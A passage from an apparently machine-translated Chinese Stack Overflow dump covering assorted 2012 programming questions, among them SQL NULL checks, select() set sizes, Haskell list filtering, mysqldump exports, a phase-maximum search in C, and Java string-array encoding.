使用`IS NULL`. 代替：

```
if @test = NULL
    SELECT 1

else 
    SELECT 2 
```

试试这个：

```
if @test IS NULL
    SELECT 1

else 
    SELECT 2 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:18:46.143

为什么不使用条件（id = @profile_id **AND** @profile_id **IS NOT NULL**）

`SELECT user_profile_id FROM tbl_profiles WHERE (id = @profile_id AND @profile_id IS NOT NULL)`

# c - FD_SETSIZE 与计算值

> ID：13271481
> 
> 赞同：2
> 
> 时间：2012-11-07T14:12:05.947
> 
> 标签：c, sockets, select-function

在服务器/客户端设置中，我有一个服务器与少数（目前为 4 个）不同套接字上的客户端连接。目前我使用带有计算 set_size 的 select，但是在值得使用 FD_SETSIZE 之前，上限是多少？

下面是一些代码示例来说明这一点。首先构建集合：

```
FD_ZERO(&set);
FD_SET(socket1, &set);
FD_SET(socket2, &set);
FD_SET(socket3, &set);
FD_SET(socket4, &set); 
```

以下是 set_size 的计算方式：

```
set_size = MAX(socket1, socket2);
set_size = MAX(set_size, socket 3);
set_size = MAX(set_size, socket4);
set_size += 1; 
```

以及用法：

```
while ((cnt = select(set_size, &set, NULL, NULL, &t)) != -1 || errno == EINTR) {
    if (cnt > 0)
        // Do different stuff depending what socket is active
    else
        // Keep everything alive and add the sockets to the set again
} 
```

最近我不得不添加两个新的套接字，将来我可能需要添加更多。什么时候使用 FD_SETSIZE 而不是计算的 set_size？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T16:26:38.767

我从不担心这一点，因为与最初使用的性能损失相比，它似乎会产生非常小的差异`select()`。

话虽如此，我认为计算正确的值总是值得的，因为计算起来并不是很昂贵：如果您`set_size`按照您的建议将电流保持在局部变量中，那么每次添加一个非常低的常数时都是**O(1)** fd（即比较，也可能是更新）。删除 fd 也是**O(1)**，除了它是列表中的最后一个（在这种情况下它是**O( `set_size`)**，但通常更好）。另一方面，不计算`set_size`内核`FD_SETSIZE`每次调用时都必须遍历所有条目的方法`select`。由于`set_size`可能比 小很多`FD_SETSIZE`，因此提供较小的值是值得的。即使`set_size`接近`FD_SETSIZE`，计算`set_size`太便宜了，它可能几乎总是值得的。

当然，如果您在这种程度上担心性能，则需要查看`poll()`而不是`select()`. 更好的是，您需要查看`epoll`and `kqueue`，但它不是可移植的，因为这些功能分别仅在 Linux 和 FreeBSD（包括 MacOS）上可用。

# python - POSTGRESQL：使用 Python 将远程服务器连接到主机数据库

> ID：13271484
> 
> 赞同：0
> 
> 时间：2012-11-07T14:12:40.697
> 
> 标签：python, sockets, postgresql, psycopg2

使用 Python/Psycopg2/PopstgreSQL 和 Cron。我想获取远程服务器信息（见下文）并将其添加到主机上的 PostGreSQL 数据库中。

```
 Using #!/usr/bin/python 
import socket 
import commands 
import string 
import os 
hostname = socket.gethostname() 
print hostname 
ip = commands.getoutput("ifconfig").split("\n")[1].split()[1][5:] 
print ip 
os = commands.getoutput("lsb_release -d") 
print os[13:34] 
kernel = commands.getoutput("uname -p") 
print kernel 
reboot = commands.getoutput("who -b") 
print reboot[22:38] 
```

这是“连接到数据库”脚本：

```
#!/usr/bin/python

import psycopg2
import sys

try:
        conn = psycopg2.connect('host=*** dbname=*** user=*** password=***')
        print "Connected to Database"
except:
        print "No Connection"

cur = conn.cursor()#cursor_factory=psycopg2.extras.DictCursor)
try:
        cur.execute('SELECT * FROM new')
        rows = cur.fetchall()
        print "\n Show: \n"
        for row in rows:
                print "   ", row
except:
        print "Not Working" 
```

我能够连接，我能够提取数据。我需要结合这两个脚本并将返回的信息插入到数据库中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:44:11.857

您的本地 python 脚本将包含以下几行：

```
import psycopg2 as db
remote_connection = db.connect('host=that_host dbname=that_db user=user password=pwd')
local_connection = db.connect('host=localhost dbname=local_db user=user password=pwd') 
```

# java - 我们可以更改移动设备的 gps 值吗？

> ID：13271486
> 
> 赞同：1
> 
> 时间：2012-11-07T14:12:42.897
> 
> 标签：java, android, iphone, asp.net

我正在尝试在需要前往不同位置的 Android 和 iPhone 上测试位置感知应用程序。

是否可以使用.Net /Java 中的某些代码来屏蔽/更改正在运行 GPS 应用程序的智能手机的 GPS 位置？这是为了使测试更容易...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:16:53.103

很确定这样的事情需要破解板载 GPS 芯片。这里最简单的解决方案是让您的应用实际模拟 GPS 坐标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T15:27:53.173

为此，我使用 Google Play 商店中的免费“假 GPS”应用程序。我确定在您的两个目标平台上都有几个可用的

# objective-c - 缓慢的 UITabBar 项目加载

> ID：13271487
> 
> 赞同：3
> 
> 时间：2012-11-07T14:12:45.047
> 
> 标签：objective-c, uiviewcontroller, uitabbarcontroller

我的项目中存在问题，这个问题会给客户带来很多不愉快的感受。所以应用程序基本上是基础的`UITabBarController`，当我想加载其中一个`UIViewController`时加载时间过长（第一次启动时约 1.5 秒，切换后出现暂停） - 如您所知，这对用户体验非常不利。所以我想知道在用户想要进入之前预加载这个部分的一些方法（部分不会首先加载）。乍一看，很少有问题是相同的，但我不想有像“加载时微调器”这样的解决方案。如果有人知道优雅的解决方案，我将非常感激。

阿列克谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-30T10:56:41.587

对我来说，这听起来像是你在你的 init 方法、`viewDidLoad`你`viewWillAppear`的`UIViewController`.
在第一次加载时我不知道答案，但您可以`UITabBarController`在后台线程中加载其他视图控制器，以便在您点击它们时加载它们。

**编辑：**
在第一次加载时，您可以使用一个非常简单的开始屏幕并在后台线程上加载第一个屏幕。但是，您将不得不添加一个新视图。

# haskell - 过滤包含列表元素的列表列表的元素

> ID：13271489
> 
> 赞同：2
> 
> 时间：2012-11-07T14:12:56.490
> 
> 标签：haskell

所以，要解释满嘴的问题……

我正在尝试使用过滤器，但没有得到任何地方。所以这就是我想要的行为。给定一个列表列表（`Integer`s），即

```
[[1,2,3],[23456,4,3,2],[1,3,4,5,6],[3,2,1],[4,2,1],[5,6,7],[1,2,5]] 
```

我想获取另一个列表，即`[1,2]`获取包含**这两个**元素的所有列表。（此时是否保留其他任何一个都没有关系，尽管以后可能需要）。所以在这个例子中我的输出会是这样的

```
[[1,2],[2,1],[2,1],[1,2]] 
```

或者最好

```
[[1,2,3],[3,2,1],[4,2,1],[1,2,5]] 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-07T14:27:55.427

首先，定义一个列表的元素成为另一个列表的子集意味着什么：

```
> let xs `isSubsetOf` ys = all (`elem` ys) xs 
```

然后你可以部分地应用这个函数来获得一个合适的谓词来过滤：

```
> let xss = [[1,2,3],[23456,4,3,2],[1,3,4,5,6],[3,2,1],[4,2,1],[5,6,7],[1,2,5]]
> filter ([1, 2] `isSubsetOf`) xss
[[1,2,3],[3,2,1],[4,2,1],[1,2,5]] 
```

这适用于小输入。对于较大的输入，您可能希望使用`Data.Set`而不是列表。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T14:26:22.380

```
ghci> import Data.Set hiding (filter)
ghci> let subset xs ys = fromList xs `isSubsetOf` fromList ys
ghci> let xs = [[1,2,3],[23456,4,3,2],[1,3,4,5,6],[3,2,1],[4,2,1],[5,6,7],[1,2,5]]
ghci> filter (subset [1,2]) xs
[[1,2,3],[3,2,1],[4,2,1],[1,2,5]] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T14:26:37.573

因此，`candidate`如果列表的所有元素`criterion`也是`candidate`. 因此你的`filter`条件是

```
condition candidate = all (`elem` candidate) criterion 
```

其中，使用`flip`我们可以写为

```
condition candidate = flip all criterion (flip elem candidate) 
```

因此给

```
filter (flip all criterion . flip elem) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-15T06:37:06.207

```
similars :: Eq a => [a] -> [[a]] -> [[a]]
similars xs  =  filter (\ ys -> all (`elem` ys) xs) 
```

意义

```
similars [1,2] [[1,2,3],[23456,4,3,2],[1,3,4,5,6],[3,2,1],[4,2,1],[5,6,7],[1,2,5]] 
```

`==`s

```
[[1,2,3],[3,2,1],[4,2,1],[1,2,5]] 
```

# jquery-mobile - 为 jQuery mobile Flip 切换开关注册虚拟点击事件

> ID：13271490
> 
> 赞同：0
> 
> 时间：2012-11-07T14:12:56.510
> 
> 标签：jquery-mobile, jquery

我不知道如何为[Flip toggle switch](http://jquerymobile.com/test/docs/forms/switch/)`taphold`注册事件。[我按照这里](http://jquerymobile.com/test/docs/forms/switch/events.html)的描述尝试了以下代码。

```
<div data-role="fieldcontain">
    Sex 
    <select name="sex" id="id" data-role="slider">
        <option value="off">Male</option>
        <option value="on">Female</option>
    </select>
</div> 
```

```
$('#id').live('taphold', function(){     
    console.log("taphold");
}); 
```

并且，由于实际的`<select>`标签是隐藏的，而开关是按照html渲染的

```
<div role="application" class="ui-slider ui-slider-switch ui-btn-down-c ui-btn-corner-all ui-focus">
    <span class="ui-slider-label ui-slider-label-a ui-btn-active ui-btn-corner-all" role="img" style="width: 100%">Female</span>
    <span class="ui-slider-label ui-slider-label-b ui-btn-down-c ui-btn-corner-all" role="img" style="width: 0%">Male</span>
    <div class="ui-slider-inneroffset">
        <a href="#" class="ui-slider-handle ui-btn ui-shadow ui-btn-corner-all ui-slider-handle-snapping ui-focus ui-btn-up-c" data-corners="true" data-shadow="true" data-iconshadow="true" data-wrapperels="span" data-theme="c" role="slider" aria-valuemin="0" aria-valuemax="1" aria-valuenow="on" aria-valuetext="Female" title="Female" aria-labelledby="eforms_patient_sex-label" style="left: 100%">
            <span class="ui-btn-inner ui-btn-corner-all">
                <span class="ui-btn-text"/>
            </span>
        </a>
    </div>
</div> 
```

哪个是上面`<select>`标签的兄弟我也试过这个

```
$('#id').parent().find('[role="application"]').live('taphold', function(){
    console.log("taphold");
}); 
```

但 ner 确实有效。那么...... **如何为jQuery mobile Flip切换开关注册虚拟点击事件？**

//编辑

我通过歌剧蜻蜓`onclick`向标签添加了一个功能，它起作用了。`<div>`因此，似乎将事件注册到`<div>`是正确的方法。但它不起作用，使用上面的代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:11:19.573

该事件称为**taphold**而不是 tabhold。

# java - Java 中的并行布尔表达式求值

> ID：13271492
> 
> 赞同：0
> 
> 时间：2012-11-07T14:13:01.160
> 
> 标签：java, boolean-expression

> **可能重复：**
> [当 Java 评估一个连词 (<boolean exp1> && <boolean exp2>) 时，如果 exp1 为假，它是否评估 exp2？](https://stackoverflow.com/questions/9445145/when-java-evaluates-a-conjunction-boolean-exp1-boolean-exp2-does-it-ev)

如果我有 2 个条件说，A 和 B，我输入：

```
A && B 
```

它们是否都并行评估，然后才进行 AND？例如，如果我输入`A && false`它会评估`A`条件还是知道它无论如何都会是假的？

如果它不是并行完成的，它是从右边开始还是从左边开始？（`A && false`VS `false && A`）。

谢谢。

编辑：明白了。谢谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:14:41.117

```
A && B 
```

不，首先评估 A，如果 A 为假，则跳过评估 B 如果 A 为真，则检查 B 是否为真

```
A && false 
```

在这种情况下，首先评估 A，如果 A 为假，则不检查下一个条件（假）。如果 A 为真，则将评估假，但由于它为假，因此整个条件将为假。

* * *

## 回答 #2

> 赞同：-4
> 
> 时间：2012-11-07T14:15:48.770

它将**从左到右**开始。**_** 也就是说，如果不涉及括号。

```
if("name".equals(variable1)){} 
```

`var1`当为空时，is 会出错。但是，当您使用：

```
if(variable1.equals("name")){} 
```

它是空安全的。

# mysql - 在mysql中导出表

> ID：13271493
> 
> 赞同：1
> 
> 时间：2012-11-07T14:13:06.613
> 
> 标签：mysql, database-design

我正在做一些原型设计，因此创建了一个包含一些表和依赖项的数据库。该项目变得比我想象的要大，现在想要清理名称、依赖项等，因此想要重新创建数据库。但是我不想再次经历创建单个表的整个过程，而是我想从我拥有的东西开始，清理创建脚本并在可能的情况下运行它们。有没有办法可以导出所有脚本来创建数据库和表？是否有工具或 mysql 命令行选项可以执行此操作？

谢谢，

-S

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:15:19.870

我建议你看看[MySql WorkBench](https://www.mysql.com/products/workbench/)

它可以做你需要的一切

[这](https://www.mysql.com/products/workbench/features.html)是所有功能的列表

> 来自实时数据库的逆向工程师
> 
> SQL 脚本的逆向工程师

另外，值得一提的是它是免费的（社区版）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:21:20.733

这可以让你开始：

`mysqldump -u user -ppassword -h host --no-create-db --no-data [other options] old_database > dump.sql`

然后您可以编辑转储文件以进行任何必要的更改并导入回新数据库：

`mysql -u user -ppassword -h host new_database < dump.sql`

有关`mysqldump`@MySQL[参考手册的更多信息](http://dev.mysql.com/doc/refman/5.1/en/mysqldump.html)

# c - 如何用更少的迭代找到最大值

> ID：13271494
> 
> 赞同：5
> 
> 时间：2012-11-07T14:13:14.157
> 
> 标签：c, interpolation, binary-search, polar-coordinates

我将信号的相位从 0 度更改为 360 度以获得最大电压值。因为如果我改变信号的相位，电压也会改变。我有下面的代码来找到最大值。

```
void Maxphase(float *max, unsigned int *index) 
{
*max = 0.0;
float value;
unsigned int i, data;
for (i=0;i<=360;i++) 
{              
    phaseset(i); 
    delay_ms(100);
    data = readvalue(); 
    value = voltage(mux1);    
    if(value > *max)   //find max value 
    { 
        *max = value;    //max voltage 
        *index = i;   
    }  
}                           
} 
```

从上面的代码中，我在 38 秒（360*100）后得到最大值（电压），因为对于每次读取操作，我的设备都需要 100 毫秒的延迟。这太大了，我无法更改硬件，因此我想通过优化软件在 2 到 3 秒内获得最大值。然后我尝试使用休闲代码。

```
void Maxphase(float *max1, unsigned int *index1) 
{
  max = 0.0;
  float value;
  unsigned int i,j,data;
  for (i=0;i<=360;i+=10) 
   {              
    phaseset(i); 
    delay_ms(100);
    data = readvalue(); 
    value = voltage(mux1);    
    if(value > max)   //find max value 
    { 
        max = value;    //max voltage 
        index = i;   
    }  
   }    
   *max1=max;
   *index1=index;
   for (i=*index1-9;i<=*index1+9;i+=1) 
     {       
     j=i;       
    phaseset(j); 
    delay_ms(100);
    data = readvalue(); 
    value = voltage(mux1);    
    if(value > *max1)   //find max value 
    { 
        *max1 = value;    //max voltage 
        *index1 = i;   
    }  
    }                         
} 
```

我将时间从 45 秒减少到 7 秒。我将迭代次数从 360 减少到 54（54*100）。我想将它减少 7 秒到 2 秒。

任何人都可以帮助我更好的算法，我可以在 2 秒内获得（0 到 360）的最大值。

我通过改变相位使用范围测量了电压值。我在下面写了它如何随相位改变电压。

```
Phase (degree)     voltage(max)
  0             0.9mv

 45             9.5mv

 90             9.0mv

135             0.9mv

180             292mv

225             601mv

270             555mv

315             230mv

360             0.9mv 
```

我是 C 编程新手。任何人都可以提供最佳算法的示例代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:25:43.273

[黄金分割搜索](http://en.wikipedia.org/wiki/Golden_section_search)可能是您所追求的。它很有效，但仍然很简单。

如果你想要更快更复杂的东西，你可以使用[Brent 的方法](http://en.wikipedia.org/wiki/Brent%27s_method)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:22:40.763

如果您可以确定 360 度上只有一个最高点，您可以进行递归分而治之。

您首先查看例如 0、180、270。假设您发现答案是 180 + 270 一起具有最高值。比你开始看 210.... 哪一边更高？等等 ...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T23:02:13.663

更新：2012-11-10。

```
#include <stdio.h>
#include <string.h>
#include <math.h>

#define FAKE_TARGET 89
unsigned fake_target = FAKE_TARGET;

float probe_one(unsigned int phase);
void Maxphase(float *max, unsigned int *index);

void Maxphase(float *max, unsigned int *index)
{

unsigned int aim, idx, victim;

struct best {
    unsigned pos;
    float val;
    } samples[4] = {{0, 0.0}, };

    for (aim = 0;aim < 360;aim += 90) {
        idx=aim/90;
        samples[idx].pos = aim;
        samples[idx].val = probe_one(samples[idx].pos);
        if (!idx || samples[idx].val < samples[victim].val ) victim = idx;
        }

        /* eliminate the weakist postion, and rotate the rest,
        ** such that:
        ** samples[0] := lower boundary.
        ** samples[1] := our best guess
        ** samples[2] := upper boundary
        ** samples[3] := scratch/probe element
        */
    fprintf(stderr, "Victim=%u\n", victim );
    switch(victim) {
    case 0: samples[0] = samples[1]; samples[1] = samples[2]; samples[2] = samples[3]; break;
    case 1: samples[1] = samples[3]; samples[3] = samples[0]; samples[0] = samples[2]; samples[2] = samples[3]; break;
    case 2: samples[2] = samples[1]; samples[1] = samples[0]; samples[0] = samples[3]; break;
    case 3: break;
    }

        /* Calculation is easier if the positions are increasing.
        ** (We can always perform the modulo 360 if needed)
        */
    if (samples[0].pos > samples[1].pos ) samples[1].pos  += 360;
    if (samples[1].pos > samples[2].pos ) samples[2].pos  += 360;

    while( 1) {
        int step;

        step = samples[2].pos - samples[0].pos;
        if (step < 3) break;

        do    {
            fprintf(stderr, "\n[%u %u %u] Diff=%d\n"
            , samples[0].pos , samples[1].pos , samples[2].pos , step);
            if (step > 0) step++; else step--;
            step /= 2;
            aim = (samples[0].pos + step ) ;
                /* avoid hitting the middle cell twice */
            if (aim %360 != samples[1].pos %360) break;
            step += 1;
            aim = (samples[0].pos + step ) ;
            if (aim %360 != samples[1].pos %360) break;
            step -= 2;
            aim = (samples[0].pos + step ) ;
            break;
            } while(0);

        fprintf(stderr, "Step=%d Aim=%u, Idx=%u\n",step, aim,idx );

        samples[3].pos = aim;
        samples[3].val = probe_one( samples[3].pos );

        victim= (samples[3].pos > samples[1].pos ) ? 2 : 0;
        if (samples[3].val > samples[1].val) idx= 1; else idx = victim;

        fprintf(stderr, "Victim=%u, TargetIdx=%u\n", victim, idx );
                /* This should not happen */
        if (samples[3].val < samples[victim].val) break;
        if (idx != victim) samples[2-victim] = samples[idx];
        samples[idx] = samples[3];
        }

    *max = samples[1].val;
    *index = samples[1].pos % 360;
}
float probe_one(unsigned int phase)
{
    float value;

#ifdef FAKE_TARGET
    int dif;
        dif = fake_target-phase;
    if (dif < -180) dif = 360+dif;
    else if (dif > 180) dif = 360-dif;
        /* value = 1.0 / (1 + pow(phase-231, 2)); */
        value = 1.0 / (1 + pow(dif, 2));
        fprintf(stderr, "Target = %d: Probe(%d:%d) := %f\n", fake_target, phase, dif, value );
        sleep (1);
#else
    unsigned int data;
    phase %= 360;
    phaseset(phase);
    delay_ms(100);
    data = readvalue();  // what is this ?
    value = voltage(mux1);
#endif

return value;
}

int main(int argc, char **argv)
{
float value;
unsigned int index;

if (argv[1]) sscanf (argv[1], "%u", &fake_target);
fake_target %= 360;

Maxphase(&value, &index) ;
printf("Phase=%u Max=%f\n", index, value );
return 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T15:40:26.190

利用这里的各种评论和建议，我展示了这段*未经测试*的代码。我不知道这是否有效或者是对现有资源的改进，但无论如何尝试都很有趣：

```
extern void phaseset(int);
extern void delay_ms(int);
extern float readvalue();
extern float voltage(int);
extern int mux1;

float probe(int phase)
{
    float data;
    phaseset(phase);
    delay_ms(100);
    data = readvalue(); /* data is ignored? */
    return voltage(mux1); /* mux1? */
}

/* helper routine, find the max in a given range [phase1, phase2] */
void maxphase_aux(int phase1, float vol1, int phase2, float vol2, int *phaseret, float *volret)
{
    float xvol1 = 0, xvol2 = 0;
    int xphase1 = -1, xphase2 = -1;

    /* test the voltage in the middle */
    int phasem = abs(phase2 - phase1) / 2;
    float volm = probe(phasem);

    if (volm > vol1 && volm > vol2) {
        /* middle point is the highest so far,
         * search left and right for maximum */
        *volret = volm;
        *phaseret = phasem;

        maxphase_aux(phase1, vol1, phasem, volm, &xphase1, &xvol1);
        maxphase_aux(phase2, vol2, phasem, volm, &xphase2, &xvol2);
    } else if (volm < vol1 && volm > vol2) {
        /* vol1 is the highest so far,
         * search between volm and vol1 for maximum */
        maxphase_aux(phase1, vol1, phasem, volm, &xphase1, &xvol1);
    } else if (volm > vol1 && volm < vol2) {
        /* vol2 is the highest so far,
         * search between volm and vol2 for maximum */
        maxphase_aux(phase2, vol2, phasem, volm, &xphase2, &xvol2);
    } else {
        /* not possible? */
        return;
    }

    if (xvol1 > volm) {
        *volret = xvol1;
        *phaseret = xphase1;
    }

    if (xvol2 > volm) {
        *volret = xvol2;
        *phaseret = xphase2;
    }
}

void maxphase(int *phaseret, float *volret)
{
    float v0 = probe(0);
    float v360 = probe(360);
    maxphase_aux(0, v0, 360, v360, phaseret, volret);
} 
```

# dhtmlx - 如何自定义 dhtmlxscheduler.js 文件以在弹出窗口中添加一些字段？

> ID：13271498
> 
> 赞同：3
> 
> 时间：2012-11-07T14:13:32.530
> 
> 标签：dhtmlx

我对 dhtmlx 调度程序有一些要求，在这里我想编辑事件并添加一个文本框和一个按钮。您能否建议我如何自定义 .js（压缩）文件。是否有任何单独的 .js 文件可用于开发版本。如果有请建议我。![在此处输入图像描述](../Images/8cb2fb2cd52f05613b9c797adf3b53a3.png)

谢谢， 拉贾塞卡

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T17:29:29.043

可以配置此表单（或灯箱）的详细信息。

有关如何执行此操作的文档在[这里](http://docs.dhtmlx.com/doku.php?id=dhtmlxscheduler%3acustom_details_form)

无需为此编辑主要的 dhtmlx 源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-09T16:06:37.840

我找到了这个解决方案：修改文件`dhtmlxscheduler.js` 我的意思是 `section`字段：

```
lightbox: {
        sections: [
            { name: "description", height: 40, map_to: "text", type: "textarea", focus: true },
            { name: "Note", height: 40, map_to: "text", type: "textarea", focus: true },
            { name: "Status", height: 40, map_to: "text", type: "textarea", focus: true },
            { name: "Type", height: 40, map_to: "text", type: "textarea", focus: true },
            { name: "Sequence", height: 40, map_to: "text", type: "textarea", focus: true },
            {name: "time", height: 72, type: "time", map_to: "auto"}
        ]
    }, 
```

和

```
labels:{
        dhx_cal_today_button:"Today",
        day_tab:"Day",
        week_tab:"Week",
        month_tab:"Month",
        new_event:"Nouvelle Tache",
        icon_save:"Save",
        icon_cancel:"Cancel",
        icon_details:"Details",
        icon_edit:"Edit",
        icon_delete:"Delete",
        confirm_closing:"",//Your changes will be lost, are your sure ?
        confirm_deleting:"Event will be deleted permanently, are you sure?",
        section_description: "Description",
        section_Note: "Note",
        section_Status: "Status",
        section_Type: "Type",
        section_Sequence: "Sequence",
        section_time:"Periode", 
```

# java - 将大写字符与小写字符匹配，Java

> ID：13271499
> 
> 赞同：0
> 
> 时间：2012-11-07T14:13:34.370
> 
> 标签：java, android, string

**如何在不使用 ToUpper/ToLower 的情况下将大写字符与小写字符匹配，这可能吗？**

例子：

```
String content = "are";
String keyword = "ARE";
if(content==keyword ){
    System.out.println("Working!");
}else{
    System.out.println("Not Working!");
} 
```

上面的代码将打印`Not Working!`.

示例 2：

```
String content = "how are you?";
String keyword = "ARE";
if(content.matches("(.*)(\\b)"+keyword+"(\\b)(.*)"))){
    System.out.println("Working!");
}else{
    System.out.println("Not Working!");
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:15:09.333

规则 1：使用`string1.equals(string2)`而不是`string1 == string2`比较字符串。

你会找到`.equalsIgnoreCase(...)`你的目的。

# android - 如何在android上的应用程序启动器图标上显示气球计数器

> ID：13271500
> 
> 赞同：4
> 
> 时间：2012-11-07T14:13:33.717
> 
> 标签：android, android-layout, notifications, icons

我想为andoid 做一个图标计数器，就像Email 和Samsung Apps 应用程序一样，我已经看到其他开发人员的此类请求，但你们都说做不到。

![在此处输入图像描述](../Images/67d5af1e55aed3568e57245487d9346d.png)

如果是这样，那两个应用程序和其他应用程序怎么能做到呢？

我必须制作多个图标图像并交换它们吗？

真的不能做吗？为什么？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T15:00:07.217

> 你们都说做不到。

那是因为它无法完成，除非由主屏幕的制造商或通过应用程序小部件（而不是启动器图标）。

> 如果是这样，那两个应用程序和其他应用程序怎么能做到呢？

因为三星编写了主屏幕，并且可以用它的主屏幕做它想做的事。

> 我必须制作多个图标图像并交换它们吗？

这不起作用，因为您无法在运行时更改启动器图标。

> 真的不能做吗？为什么？

这真的可以通过制作应用小部件或制作您自己的主屏幕来完成。

# css - twitter bootstrap 预输入下拉菜单

> ID：13271502
> 
> 赞同：1
> 
> 时间：2012-11-07T14:13:43.603
> 
> 标签：css, ruby-on-rails-3, html, twitter-bootstrap

嗨，我正在使用 twitter 引导程序。我在模型窗口中使用了预输入。我的问题是当我在文本框中输入时，下拉菜单非常完美，但它位于文本框的最底部。我观察到当下拉菜单出现时有属性 top 设置。但我不知道如何在运行时更改它。

这是图像：![在此处输入图像描述](../Images/c4caead87d129d32c510e9c0a5ef867c.png)

我不擅长 CSS。谁能告诉我应该怎么做才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T03:29:28.637

您需要在引导程序中覆盖 typeahead 类的一些默认样式。具体来说，我可以通过将位置设置为相对并将 z-index 设置为 10000 来使其正确显示。位置属性要求您使用 !important 声明。

```
.typeahead {
    position:relative !important;
    z-index:10000;
}​ 
```

[在http://jsfiddle.net/technotarek/Msttw/](http://jsfiddle.net/technotarek/Msttw/)上查看我的工作小提琴。

请注意，我的预输入值是彩虹的颜色，以防您无法触发它。

此外，根据您的确切表单布局，您可能必须通过使用顶部/底部或左/右 CSS 属性来根据自己的情况调整 typeahead 元素的位置。

# java - 在Java中将数组字符串转换为字符串并返回

> ID：13271503
> 
> 赞同：10
> 
> 时间：2012-11-07T14:13:44.490
> 
> 标签：java, string, encoding

我在 Java 中有一个数组 String[]，必须首先将其编码/转换为 String，然后在代码中进一步将其转换回 String[] 数组。问题是我可以在 String[] 数组中的字符串中包含任何字符，因此在编码时必须非常小心。解码它所需的所有信息都必须在最终字符串中。我无法在额外变量中返回字符串和其他一些信息。

到目前为止，我设计的算法是：

1.  将所有字符串彼此相邻附加，例如： String[] a = {"lala", "exe", "a"} into String b = "lalaexea"

2.  在字符串末尾附加来自 String[] 的所有字符串的长度，用 $ 符号与正文分隔，然后每个长度用逗号分隔，因此：

b = "lalaexea$4,3,1"

然后在转换回来时，我会先从后面读取长度，然后根据它们，真正的字符串。

但也许有更简单的方法？

干杯!

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-07T14:39:39.547

如果您不想花太多时间在字符串操作上，您可以使用 java 序列化 +[公共编解码器](http://commons.apache.org/codec/)，如下所示：

```
public void stringArrayTest() throws IOException, ClassNotFoundException, DecoderException {
    String[] strs = new String[] {"test 1", "test 2", "test 3"};
    System.out.println(Arrays.toString(strs));

    // serialize
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    new ObjectOutputStream(out).writeObject(strs);

    // your string
    String yourString = new String(Hex.encodeHex(out.toByteArray()));
    System.out.println(yourString);

    // deserialize
    ByteArrayInputStream in = new ByteArrayInputStream(Hex.decodeHex(yourString.toCharArray()));
    System.out.println(Arrays.toString((String[]) new ObjectInputStream(in).readObject()));
} 
```

这将返回以下输出：

```
[test 1, test 2, test 3]
aced0005757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000003740006746573742031740006746573742032740006746573742033
[test 1, test 2, test 3] 
```

如果您使用的是 maven，则可以将以下依赖项用于 commons 编解码器：

```
<dependency>
    <groupId>commons-codec</groupId>
    <artifactId>commons-codec</artifactId>
    <version>1.2</version>
</dependency> 
```

正如 base64 所建议的（两行更改）：

```
String yourString = new String(Base64.encodeBase64(out.toByteArray()));
ByteArrayInputStream in = new ByteArrayInputStream(Base64.decodeBase64(yourString.getBytes())); 
```

在 Base64 的情况下，结果字符串更短，对于下面公开的代码：

```
[test 1, test 2, test 3]
rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAN0AAZ0ZXN0IDF0AAZ0ZXN0IDJ0AAZ0ZXN0IDM=
[test 1, test 2, test 3] 
```

关于每种方法的时间，我对每种方法执行 10^5 次，结果如下：

*   字符串操作：156 毫秒
*   十六进制：376 毫秒
*   Base64：379 毫秒

用于测试的代码：

```
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.StringTokenizer;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;

public class StringArrayRepresentationTest {

    public static void main(String[] args) throws IOException, ClassNotFoundException, DecoderException {

        String[] strs = new String[] {"test 1", "test 2", "test 3"};

        long t = System.currentTimeMillis();
        for (int i =0; i < 100000;i++) {
            stringManipulation(strs);
        }
        System.out.println("String manipulation: " + (System.currentTimeMillis() - t));

        t = System.currentTimeMillis();
        for (int i =0; i < 100000;i++) {
            testHex(strs);
        }
        System.out.println("Hex: " + (System.currentTimeMillis() - t));

        t = System.currentTimeMillis();
        for (int i =0; i < 100000;i++) {
            testBase64(strs);
        }
        System.out.println("Base64: " + (System.currentTimeMillis() - t));
    }

    public static void stringManipulation(String[] strs) {
        String result = serialize(strs);
        unserialize(result);
    }

    private static String[] unserialize(String result) {
        int sizesSplitPoint = result.toString().lastIndexOf('$');
        String sizes = result.substring(sizesSplitPoint+1);
        StringTokenizer st = new StringTokenizer(sizes, ";");
        String[] resultArray = new String[st.countTokens()];

        int i = 0;
        int lastPosition = 0;
        while (st.hasMoreTokens()) {
            String stringLengthStr = st.nextToken();
            int stringLength = Integer.parseInt(stringLengthStr);
            resultArray[i++] = result.substring(lastPosition, lastPosition + stringLength);
            lastPosition += stringLength;
        }
        return resultArray;
    }

    private static String serialize(String[] strs) {
